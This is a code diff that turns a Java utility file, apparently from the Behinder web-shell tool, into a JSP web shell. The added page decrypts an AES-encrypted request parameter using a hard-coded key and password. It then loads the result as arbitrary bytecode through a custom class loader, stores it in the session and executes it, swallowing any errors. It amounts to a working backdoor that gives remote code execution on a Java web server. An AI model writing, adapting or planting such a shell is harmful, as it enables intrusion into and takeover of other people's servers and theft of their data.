@@ -1,13 +1,30 @@
-package net.rebeyond.behinder.utils;
+<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
+<%!
+    //定制后改良的，实际上就是去掉了 response.getWriter().write ，因为Behinder3不需要
 
-/**
- * @author zhanghaishan
- * @version V1.0
- * TODO:
- * 2020/9/3.
- */
-public class EncodeUtil {
+    String xc = "9336ebf25087d91c";
+    String pass = "zz";
+    String md5 = md5(pass + xc);
 
+    class X extends ClassLoader {
+        public X(ClassLoader z) {
+            super(z);
+        }
+
+        public Class Q(byte[] cb) {
+            return super.defineClass(cb, 0, cb.length);
+        }
+    }
+
+    public byte[] x(byte[] s, boolean m) {
+        try {
+            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
+            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
+            return c.doFinal(s);
+        } catch (Exception e) {
+            return null;
+        }
+    }
 
     public static String md5(String s) {
         String ret = null;
@@ -58,13 +75,22 @@ public class EncodeUtil {
         return value;
     }
 
-    public static byte[] x(byte[] s,String xc, boolean m) {
-        try {
-            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
-            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
-            return c.doFinal(s);
-        } catch (Exception e) {
-            return null;
+%>
+<%
+
+    try{
+        System.out.println("sessiongid:"+session.getId());
+        byte[] data = base64Decode(request.getParameter(pass));
+        data = x(data, false);
+        if (session.getAttribute("payload") == null) {
+            session.setAttribute("payload", new X(pageContext.getClass().getClassLoader()).Q(data));
+        } else {
+            request.setAttribute("parameters", new String(data));
+            Object f = ((Class) session.getAttribute("payload")).newInstance();
+            f.equals(pageContext);
         }
+    }catch (Exception e){
+        //还是不要抛异常了
     }
-}
+
+%>
